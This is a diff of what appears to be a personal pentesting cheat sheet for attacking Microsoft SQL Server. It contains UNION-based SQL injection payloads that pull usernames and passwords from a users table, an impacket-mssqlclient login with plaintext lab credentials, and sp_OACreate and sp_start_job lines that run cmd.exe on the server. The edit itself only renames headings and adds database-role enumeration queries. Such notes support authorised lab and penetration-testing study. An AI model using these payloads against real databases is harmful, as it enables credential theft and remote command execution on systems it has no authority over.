@@ -455,7 +455,7 @@ test' union select 1,DB_NAME(),3,4,5,6--
 test' union select 1,name,3,4,5,6 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'users')--
 test' union select 1,CONCAT(username, ' ', password),3,4,5,6 FROM users--
 ```
-#### inLine
+#### impacket-mssqlclient
 https://book.hacktricks.xyz/v/jp/network-services-pentesting/pentesting-mssql-microsoft-sql-server
 ```bash
 impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
@@ -493,7 +493,9 @@ DECLARE @objShell INT; DECLARE @output varchar(8000); EXEC @output = sp_OACreate
 sp_start_job cmd.exe /c "whoami > C:\Windows\Tasks\tmp.txt"
 
 # trustworthy
-## Abuse NULL
+## role name and member
+enum_db
+USE [DBname];
 SELECT b.name, c.name FROM [DBname].sys.database_role_members a JOIN [DBname].sys.database_principals b ON a.role_principal_id = b.principal_id LEFT JOIN [DBname].sys.database_principals c ON a.member_principal_id = c.principal_id;
 
 # Link Server list
